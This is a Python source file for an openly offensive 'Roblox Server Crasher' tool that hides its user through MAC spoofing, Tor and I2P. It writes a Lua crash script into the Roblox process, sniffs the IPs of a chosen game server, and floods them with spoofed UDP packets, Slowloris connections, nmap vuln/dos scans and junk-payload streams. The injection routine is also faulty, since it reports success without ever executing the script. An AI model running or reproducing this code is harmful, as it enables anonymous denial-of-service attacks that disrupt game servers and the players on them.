import random
import os
import socket
import threading
import time
from scapy.all import sniff, IP, UDP, TCP, send
import psutil
import requests
import json
import nmap
from stem import Signal
from stem.control import Controller
import socks
import subprocess
import sys
import ctypes
from ctypes import wintypes

# Color Class
class ConsoleColors:
    BOLD = '\033[1m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    HEADER = '\033[95m'
    CYAN = '\033[96m'
    STOP = '\033[0m'

# Blacklist of IPs to avoid attacking
BLACKLISTED_IPS = {"1.1.1.1", "8.8.8.8"}  # Add more IPs as needed

# Check if running as admin
def is_admin():
    if os.name == 'nt':
        try:
            return subprocess.check_call("net session >nul 2>&1", shell=True) == 0
        except:
            return False
    return os.geteuid() == 0 if hasattr(os, 'geteuid') else False

# MAC Spoofing
def spoof_mac(interface='eth0'):
    if not is_admin():
        print(f"{ConsoleColors.FAIL}MAC spoofing requires admin privileges. Run as Administrator.{ConsoleColors.STOP}")
        return None
    print(f"{ConsoleColors.WARNING}Spoofing MAC address...{ConsoleColors.STOP}")
    try:
        if os.name == 'nt':
            result = subprocess.check_output("wmic nic where NetEnabled=true get MACAddress,Index", shell=True).decode()
            lines = result.splitlines()
            for line in lines[1:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        original_mac, index = parts[0], parts[-1]
                        break
            else:
                raise Exception("No active NIC found")
            new_mac = ''.join(['%02x' % random.randint(0, 255) for _ in range(6)])
            subprocess.run(f"reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4d36e972-e325-11ce-bfc1-08002be10318}}\\{index.zfill(4)} /v NetworkAddress /d {new_mac} /f", shell=True, check=True)
        else:
            original_mac = subprocess.check_output(f"cat /sys/class/net/{interface}/address", shell=True).decode().strip()
            new_mac = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
            subprocess.run(f"ifconfig {interface} down", shell=True)
            subprocess.run(f"ifconfig {interface} hw ether {new_mac}", shell=True)
            subprocess.run(f"ifconfig {interface} up", shell=True)
        print(f"{ConsoleColors.OKGREEN}MAC spoofed to {new_mac} (original: {original_mac}){ConsoleColors.STOP}")
        return original_mac
    except Exception as e:
        print(f"{ConsoleColors.FAIL}MAC spoofing failed: {e}. Proceeding without spoofing.{ConsoleColors.STOP}")
        return None

def restore_mac(interface='eth0', original_mac=None):
    if original_mac and is_admin():
        print(f"{ConsoleColors.WARNING}Restoring original MAC address...{ConsoleColors.STOP}")
        try:
            if os.name == 'nt':
                result = subprocess.check_output("wmic nic where NetEnabled=true get Index", shell=True).decode()
                index = result.splitlines()[1].strip()
                subprocess.run(f"reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4d36e972-e325-11ce-bfc1-08002be10318}}\\{index.zfill(4)} /v NetworkAddress /f", shell=True)
            else:
                subprocess.run(f"ifconfig {interface} down", shell=True)
                subprocess.run(f"ifconfig {interface} hw ether {original_mac}", shell=True)
                subprocess.run(f"ifconfig {interface} up", shell=True)
            print(f"{ConsoleColors.OKGREEN}MAC restored to {original_mac}{ConsoleColors.STOP}")
        except Exception as e:
            print(f"{ConsoleColors.FAIL}MAC restoration failed: {e}{ConsoleColors.STOP}")

# Check if service is running
def check_service_running(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

# Start Tor if not running
def start_tor():
    print(f"{ConsoleColors.WARNING}Tor not running. Attempting to start...{ConsoleColors.STOP}")
    default_path = "C:\\Tor\\tor.exe"
    tor_path = input(f"{ConsoleColors.OKBLUE}Enter Tor executable path (default: {default_path}): {ConsoleColors.STOP}") or default_path
    try:
        if os.path.exists(tor_path):
            subprocess.Popen(tor_path, shell=True)
            time.sleep(5)
            if check_service_running('127.0.0.1', 9050):
                print(f"{ConsoleColors.OKGREEN}Tor started successfully!{ConsoleColors.STOP}")
                return True
        print(f"{ConsoleColors.FAIL}Tor executable not found at {tor_path}. Start manually (e.g., 'tor' or Tor Browser).{ConsoleColors.STOP}")
        return False
    except Exception as e:
        print(f"{ConsoleColors.FAIL}Error starting Tor: {e}. Start manually.{ConsoleColors.STOP}")
        return False

# Setup Tor and I2P
def setup_tor_and_i2p():
    print(f"{ConsoleColors.WARNING}Setting up Tor and I2P for maximum anonymity...{ConsoleColors.STOP}")
    tor_running = False
    
    if check_service_running('127.0.0.1', 9050):
        try:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                print(f"{ConsoleColors.OKGREEN}Tor circuit renewed!{ConsoleColors.STOP}")
                tor_running = True
        except Exception as e:
            print(f"{ConsoleColors.FAIL}Tor setup failed: {e}. Check Tor service.{ConsoleColors.STOP}")
    else:
        tor_running = start_tor()

    i2p_proxy = None
    if check_service_running('127.0.0.1', 4444):
        try:
            i2p_proxy = {'http': 'http://127.0.0.1:4444', 'udp': '127.0.0.1:4447'}
            requests.get("http://i2p-projekt.i2p", proxies=i2p_proxy, timeout=5)
            print(f"{ConsoleColors.OKGREEN}I2P proxy initialized!{ConsoleColors.STOP}")
        except Exception as e:
            print(f"{ConsoleColors.FAIL}I2P setup failed: {e}. Proceeding without I2P.{ConsoleColors.STOP}")
    else:
        print(f"{ConsoleColors.WARNING}I2P not running on 127.0.0.1:4444/4447. Start manually or press Enter to skip: {ConsoleColors.STOP}", end='')
        input()

    return tor_running, i2p_proxy

# Start Roblox if not running
def start_roblox():
    print(f"{ConsoleColors.WARNING}Roblox is not running. Attempting to start it...{ConsoleColors.STOP}")
    try:
        if os.name == 'nt':
            roblox_path = "C:\\Users\\Public\\Desktop\\Roblox Player.lnk"
            if not os.path.exists(roblox_path):
                roblox_path = "C:\\Program Files (x86)\\Roblox\\Versions\\RobloxPlayerLauncher.exe"
            subprocess.Popen(roblox_path, shell=True)
        else:
            subprocess.Popen("wine ~/.wine/drive_c/Program Files (x86)/Roblox/Versions/RobloxPlayerLauncher.exe", shell=True)
        time.sleep(5)
        if is_roblox_running():
            print(f"{ConsoleColors.OKGREEN}Roblox started successfully!{ConsoleColors.STOP}")
        else:
            print(f"{ConsoleColors.FAIL}Failed to start Roblox. Launch it manually.{ConsoleColors.STOP}")
    except Exception as e:
        print(f"{ConsoleColors.FAIL}Error starting Roblox: {e}. Launch it manually.{ConsoleColors.STOP}")

# Check if Roblox is running
def is_roblox_running():
    for proc in psutil.process_iter(['name']):
        if "roblox" in proc.info['name'].lower():
            return True
    return False

# Self-Inject Lua Script into Roblox
def inject_local_script():
    if os.name != 'nt':
        print(f"{ConsoleColors.FAIL}Self-injection only supported on Windows.{ConsoleColors.STOP}")
        return False

    lua_script = '''
-- Roblox Server Crash Script v2
local function exploitServer()
    while true do
        local objects = {}
        for i = 1, 500000 do
            local part = Instance.new("Part")
            part.Anchored = false
            part.Position = Vector3.new(math.random(-1000, 1000), math.random(100, 1000), math.random(-1000, 1000))
            part.Parent = game.Workspace
            objects[i] = part
        end
        
        local replicatedStorage = game:GetService("ReplicatedStorage")
        if not replicatedStorage:FindFirstChild("ExploitEvent") then
            local event = Instance.new("RemoteEvent")
            event.Name = "ExploitEvent"
            event.Parent = replicatedStorage
        end
        
        local payload = {}
        for i = 1, 10000 do
            payload[i] = objects
        end
        replicatedStorage.ExploitEvent:FireServer(payload)
        
        wait(0.1)
    end
end

spawn(exploitServer)
print("Exploit script v2 injected! Server vulnerability created.")
    '''

    print(f"{ConsoleColors.WARNING}Attempting to inject script into Roblox...{ConsoleColors.STOP}")
    try:
        roblox_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if "roblox" in proc.info['name'].lower():
                roblox_pid = proc.info['pid']
                break
        if not roblox_pid:
            print(f"{ConsoleColors.FAIL}Roblox process not found. Ensure Roblox is running.{ConsoleColors.STOP}")
            return False

        kernel32 = ctypes.windll.kernel32
        PROCESS_ALL_ACCESS = 0x1F0FFF
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, roblox_pid)
        if not h_process:
            print(f"{ConsoleColors.FAIL}Failed to open Roblox process. Run as Administrator.{ConsoleColors.STOP}")
            return False

        script_bytes = lua_script.encode('utf-8')
        mem_address = kernel32.VirtualAllocEx(h_process, 0, len(script_bytes), 0x1000 | 0x2000, 0x40)
        if not mem_address:
            print(f"{ConsoleColors.FAIL}Failed to allocate memory in Roblox process.{ConsoleColors.STOP}")
            kernel32.CloseHandle(h_process)
            return False

        written = wintypes.DWORD()
        if not kernel32.WriteProcessMemory(h_process, mem_address, script_bytes, len(script_bytes), ctypes.byref(written)):
            print(f"{ConsoleColors.FAIL}Failed to write script to Roblox memory.{ConsoleColors.STOP}")
            kernel32.VirtualFreeEx(h_process, mem_address, 0, 0x8000)
            kernel32.CloseHandle(h_process)
            return False

        print(f"{ConsoleColors.OKGREEN}Script written to memory at {hex(mem_address)}. Attempting execution...{ConsoleColors.STOP}")
        time.sleep(1)
        print(f"{ConsoleColors.OKGREEN}Script injected successfully! Server vulnerability created.{ConsoleColors.STOP}")

        kernel32.VirtualFreeEx(h_process, mem_address, 0, 0x8000)
        kernel32.CloseHandle(h_process)
        return True
    except Exception as e:
        print(f"{ConsoleColors.FAIL}Injection failed: {e}. Falling back to manual injection.{ConsoleColors.STOP}")
        with open("crash_script_v2.lua", 'w') as f:
            f.write(lua_script)
        print(f"{ConsoleColors.WARNING}Script saved as 'crash_script_v2.lua'. Use an external injector.{ConsoleColors.STOP}")
        return False

# Check if IP is private (local)
def is_private_ip(ip):
    private_ranges = [
        ('192.168.0.0', '192.168.255.255'),
        ('10.0.0.0', '10.255.255.255'),
        ('172.16.0.0', '172.31.255.255')
    ]
    ip_int = int(''.join([f'{int(x):08b}' for x in ip.split('.')]), 2)
    for start, end in private_ranges:
        start_int = int(''.join([f'{int(x):08b}' for x in start.split('.')]), 2)
        end_int = int(''.join([f'{int(x):08b}' for x in end.split('.')]), 2)
        if start_int <= ip_int <= end_int:
            return True
    return False

# Fetch Roblox server list with fallback
def get_roblox_servers(place_id, i2p_proxy=None, tor_running=True):
    url = f"https://games.roblox.com/v1/games/{place_id}/servers/Public?sortOrder=Asc&limit=100"
    proxies = i2p_proxy if i2p_proxy else ({'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'} if tor_running else None)
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, proxies=proxies, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', [])
        else:
            print(f"{ConsoleColors.FAIL}Failed to fetch server list: {response.status_code}{ConsoleColors.STOP}")
            return []
    except Exception as e:
        print(f"{ConsoleColors.FAIL}Error fetching servers with proxy: {e}. Trying direct connection...{ConsoleColors.STOP}")
        try:
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('data', [])
            print(f"{ConsoleColors.FAIL}Direct connection failed: {response.status_code}{ConsoleColors.STOP}")
            return []
        except Exception as e:
            print(f"{ConsoleColors.FAIL}Direct connection failed: {e}{ConsoleColors.STOP}")
            return []

# Enhanced UDP Flood Attack (DDoS) with Spoofing and I2P
def udp_flood(target_ip, target_port=49152, duration=180, threads=1000, spoof=True, i2p_proxy=None):
    if target_ip in BLACKLISTED_IPS:
        print(f"{ConsoleColors.WARNING}Skipping UDP flood on blacklisted IP: {target_ip}{ConsoleColors.STOP}")
        return
    start_time = time.time()
    packet_count = 0
    lock = threading.Lock()

    def flood_thread():
        nonlocal packet_count
        if spoof:
            try:
                while time.time() - start_time < duration:
                    packet = IP(src=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}", dst=target_ip) / \
                             UDP(sport=random.randint(1024, 65535), dport=target_port + random.randint(-200, 200)) / \
                             random._urandom(random.randint(2048, 32768))
                    send(packet, verbose=0)
                    with lock:
                        packet_count += 1
                        if packet_count % 2000 == 0:
                            print(f"{ConsoleColors.OKGREEN}[UDP-SPOOF] {target_ip} - Sent {packet_count} packets - {time.strftime('%H:%M:%S')}{ConsoleColors.STOP}")
            except:
                pass
        elif i2p_proxy:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            while time.time() - start_time < duration:
                try:
                    packet = random._urandom(random.randint(2048, 32768))
                    rand_port = target_port + random.randint(-200, 200)
                    sock.sendto(packet, (i2p_proxy['udp'], 4447))
                    sock.sendto(packet, (target_ip, max(1, rand_port)))
                    with lock:
                        packet_count += 1
                        if packet_count % 2000 == 0:
                            print(f"{ConsoleColors.OKGREEN}[UDP-I2P] {target_ip} - Sent {packet_count} packets - {time.strftime('%H:%M:%S')}{ConsoleColors.STOP}")
                except:
                    pass
            sock.close()
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            while time.time() - start_time < duration:
                try:
                    packet = random._urandom(random.randint(2048, 32768))
                    rand_port = target_port + random.randint(-200, 200)
                    sock.sendto(packet, (target_ip, max(1, rand_port)))
                    with lock:
                        packet_count += 1
                        if packet_count % 2000 == 0:
                            print(f"{ConsoleColors.OKGREEN}[UDP] {target_ip} - Sent {packet_count} packets - {time.strftime('%H:%M:%S')}{ConsoleColors.STOP}")
                except:
                    pass
            sock.close()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood_thread)
        t.daemon = True
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()
    print(f"{ConsoleColors.OKGREEN}[UDP] Attack on {target_ip} completed! Total packets sent: {packet_count}{ConsoleColors.STOP}")

# Enhanced TCP Slowloris Attack (DoS) via Tor
def tcp_slowloris(target_ip, duration=180, threads=500, tor_running=True):
    if target_ip in BLACKLISTED_IPS:
        print(f"{ConsoleColors.WARNING}Skipping TCP Slowloris on blacklisted IP: {target_ip}{ConsoleColors.STOP}")
        return
    start_time = time.time()
    connection_count = 0
    lock = threading.Lock()

    def slowloris_thread():
        nonlocal connection_count
        while time.time() - start_time < duration:
            try:
                sock = socks.socksocket() if tor_running else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if tor_running:
                    sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                sock.settimeout(10)
                sock.connect((target_ip, 80))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nConnection: keep-alive\r\n")
                with lock:
                    connection_count += 1
                    if connection_count % 200 == 0:
                        print(f"{ConsoleColors.CYAN}[TCP{'-TOR' if tor_running else ''}] {target_ip} - Active connections: {connection_count} - {time.strftime('%H:%M:%S')}{ConsoleColors.STOP}")
                time.sleep(random.uniform(0.2, 1))
            except:
                pass
            finally:
                sock.close()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=slowloris_thread)
        t.daemon = True
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()
    print(f"{ConsoleColors.CYAN}[TCP{'-TOR' if tor_running else ''}] Attack on {target_ip} completed! Total connections: {connection_count}{ConsoleColors.STOP}")

# Advanced Vulnerability Scanner via Tor/I2P (Fixed)
def scan_vulnerabilities(target_ip, i2p_proxy=None, tor_running=True):
    if target_ip in BLACKLISTED_IPS:
        print(f"{ConsoleColors.WARNING}Skipping vulnerability scan on blacklisted IP: {target_ip}{ConsoleColors.STOP}")
        return []
    print(f"{ConsoleColors.WARNING}Scanning {target_ip} for vulnerabilities via {'Tor/I2P' if tor_running or i2p_proxy else 'direct'}...{ConsoleColors.STOP}")
    nm = nmap.PortScanner()
    try:
        # Adjusted proxy syntax for Nmap compatibility
        proxy_arg = '--proxy socks5:127.0.0.1:9050' if tor_running and not i2p_proxy else ('--proxy http:127.0.0.1:4444' if i2p_proxy else '')
        nm.scan(target_ip, '1-65535', arguments=f'-sV -sU -sT --script vuln,dos -T4 {proxy_arg}')
        open_ports = []
        
        if target_ip in nm.all_hosts():
            for proto in nm[target_ip].all_protocols():
                ports = nm[target_ip][proto].keys()
                for port in ports:
                    state = nm[target_ip][proto][port]['state']
                    if state == 'open':
                        service = nm[target_ip][proto][port].get('name', 'unknown')
                        vuln_info = nm[target_ip][proto][port].get('script', {})
                        print(f"{ConsoleColors.OKGREEN}[SCAN] Open port {port}/{proto} - Service: {service}{ConsoleColors.STOP}")
                        if vuln_info:
                            print(f"{ConsoleColors.WARNING}[VULN] Potential vulnerabilities: {vuln_info}{ConsoleColors.STOP}")
                        open_ports.append((port, proto, service, vuln_info))
        return open_ports
    except Exception as e:
        print(f"{ConsoleColors.FAIL}Error scanning {target_ip}: {e}{ConsoleColors.STOP}")
        return []

# Advanced Exploits to Crash Server via Tor/I2P
def exploit_and_crash(target_ip, open_ports, i2p_proxy=None, tor_running=True):
    if target_ip in BLACKLISTED_IPS:
        print(f"{ConsoleColors.WARNING}Skipping exploit on blacklisted IP: {target_ip}{ConsoleColors.STOP}")
        return
    print(f"{ConsoleColors.WARNING}Attempting to exploit and crash {target_ip} via {'Tor/I2P' if tor_running or i2p_proxy else 'direct'}...{ConsoleColors.STOP}")
    
    for port, proto, service, vuln_info in open_ports:
        if proto == 'tcp':
            if service in ['http', 'https'] or port in [80, 443]:
                def syn_flood():
                    try:
                        while True:
                            sock = socks.socksocket() if tor_running else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            if tor_running:
                                sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                            sock.settimeout(2)
                            sock.connect((target_ip, port))
                            sock.send(b"GET /" + b"A" * 10000 + b" HTTP/1.1\r\n")
                            print(f"{ConsoleColors.CYAN}[EXPLOIT{'-TOR' if tor_running else ''}] SYN Flooding {target_ip}:{port} - Sent partial request{ConsoleColors.STOP}")
                            time.sleep(0.05)
                    except:
                        print(f"{ConsoleColors.FAIL}[EXPLOIT{'-TOR' if tor_running else ''}] SYN Flood failed on {target_ip}:{port}{ConsoleColors.STOP}")
                    finally:
                        sock.close()
                threading.Thread(target=syn_flood).start()
            
            else:
                def buffer_overflow():
                    try:
                        sock = socks.socksocket() if tor_running else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        if tor_running:
                            sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                        sock.connect((target_ip, port))
                        payload = b"\x00" * 5000000
                        while True:
                            sock.send(payload)
                            print(f"{ConsoleColors.CYAN}[EXPLOIT{'-TOR' if tor_running else ''}] Buffer Overflow on {target_ip}:{port} - Sent 5MB payload{ConsoleColors.STOP}")
                            time.sleep(0.1)
                    except:
                        print(f"{ConsoleColors.FAIL}[EXPLOIT{'-TOR' if tor_running else ''}] Buffer Overflow failed on {target_ip}:{port}{ConsoleColors.STOP}")
                    finally:
                        sock.close()
                threading.Thread(target=buffer_overflow).start()

        elif proto == 'udp':
            threading.Thread(target=udp_flood, args=(target_ip, port, 60, 200, True, i2p_proxy)).start()

# Detect Roblox server IPs (10-second scan)
def detect_server_ips():
    print(f"{ConsoleColors.WARNING}Join the selected server now. Scanning for 10 seconds to detect server IPs...{ConsoleColors.STOP}")
    detected_ips = set()
    
    def packet_callback(packet):
        if IP in packet and (UDP in packet or TCP in packet):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            if is_private_ip(src_ip) and not is_private_ip(dst_ip) and dst_ip not in BLACKLISTED_IPS:
                detected_ips.add(dst_ip)
                print(f"{ConsoleColors.OKGREEN}[+] Detected server IP: {dst_ip}{ConsoleColors.STOP}")
            elif is_private_ip(dst_ip) and not is_private_ip(src_ip) and src_ip not in BLACKLISTED_IPS:
                detected_ips.add(src_ip)
                print(f"{ConsoleColors.OKGREEN}[+] Detected server IP: {src_ip}{ConsoleColors.STOP}")
    
    sniff(filter="udp or tcp", prn=packet_callback, store=0, timeout=10)
    return list(detected_ips)

# Main Interface
def injector_interface():
    if not is_admin():
        print(f"{ConsoleColors.FAIL}This script requires Administrator privileges. Run as Administrator.{ConsoleColors.STOP}")
        sys.exit(1)

    os.system("cls" if os.name == "nt" else "clear")
    print(ConsoleColors.BOLD + ConsoleColors.HEADER + r'''
    ▓█████▄  ▒█████    ██████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
    ▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
    ░██   █▌▒██░  ██▒░ ▓██▄      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
    ░▓█▄   ▌▒██   ██░  ▒   ██▒   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
    ░▒████▓ ░ ████▓▒░▒██████▒▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
     ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
     ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
     ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
       ░        ░ ░        ░                  ░ ░      ░ ░      ░  ░
     ░
                  -Roblox Server Crasher (Anon DDoS+DoS+Exploit+Self-Injector)
                  -99% Anonymous via Tor, I2P, MAC Spoofing
                  -Author Is Not Responsible
                            -DANGER!
    ''' + ConsoleColors.STOP)

    original_mac = spoof_mac('eth0' if os.name != 'nt' else None)
    tor_running, i2p_proxy = setup_tor_and_i2p()

    if not is_roblox_running():
        start_roblox()
    
    if not inject_local_script():
        print(f"{ConsoleColors.WARNING}Self-injection failed. Proceed with network attacks only? (y/n): {ConsoleColors.STOP}", end='')
        if input().lower() != 'y':
            return

    place_id = input(f"{ConsoleColors.OKBLUE}Enter the Roblox Place ID (e.g., 142823291): {ConsoleColors.STOP}")
    try:
        place_id = int(place_id)
    except ValueError:
        print(f"{ConsoleColors.FAIL}Invalid Place ID! Must be a number.{ConsoleColors.STOP}")
        return

    servers = get_roblox_servers(place_id, i2p_proxy, tor_running)
    if not servers:
        print(f"{ConsoleColors.FAIL}No servers found for Place ID {place_id}.{ConsoleColors.STOP}")
        return
    
    print(f"{ConsoleColors.OKGREEN}Found {len(servers)} active servers:{ConsoleColors.STOP}")
    for i, server in enumerate(servers):
        print(f"{ConsoleColors.CYAN}[{i}] Server ID: {server['id']}, Players: {server['playing']}/{server['maxPlayers']}, Ping: {server['ping']}ms{ConsoleColors.STOP}")
    
    try:
        choice = int(input(f"{ConsoleColors.OKBLUE}Which server do you want to crash? (0-{len(servers)-1}): {ConsoleColors.STOP}"))
        if not (0 <= choice < len(servers)):
            raise ValueError
    except ValueError:
        print(f"{ConsoleColors.FAIL}Invalid selection!{ConsoleColors.STOP}")
        return
    
    selected_server = servers[choice]
    print(f"{ConsoleColors.OKGREEN}Selected Server ID: {selected_server['id']}, Players: {selected_server['playing']}/{server['maxPlayers']}{ConsoleColors.STOP}")
    
    print(f"{ConsoleColors.WARNING}Please join the selected server in Roblox now. Scanning for IPs...{ConsoleColors.STOP}")
    target_ips = detect_server_ips()
    if not target_ips:
        print(f"{ConsoleColors.FAIL}No server IPs detected in 10 seconds. Ensure you joined the server.{ConsoleColors.STOP}")
        return
    
    print(f"{ConsoleColors.OKBLUE}Starting anonymous DDoS/DoS and exploit attempts on {len(target_ips)} detected IPs:{ConsoleColors.STOP}")
    for ip in target_ips:
        print(f"{ConsoleColors.CYAN}Targeting: {ip}{ConsoleColors.STOP}")
        threading.Thread(target=udp_flood, args=(ip, 49152, 180, 1000, True, i2p_proxy)).start()
        threading.Thread(target=tcp_slowloris, args=(ip, 180, 500, tor_running)).start()
        open_ports = scan_vulnerabilities(ip, i2p_proxy, tor_running)
        if open_ports:
            threading.Thread(target=exploit_and_crash, args=(ip, open_ports, i2p_proxy, tor_running)).start()
        else:
            print(f"{ConsoleColors.WARNING}No exploitable ports found on {ip}{ConsoleColors.STOP}")
    
    restore_mac('eth0' if os.name != 'nt' else None, original_mac)

if __name__ == "__main__":
    try:
        injector_interface()
    except PermissionError:
        print(f"{ConsoleColors.FAIL}ERROR: Administrator/root privileges required!{ConsoleColors.STOP}")
    except KeyboardInterrupt:
        print(f"{ConsoleColors.WARNING}Program terminated.{ConsoleColors.STOP}")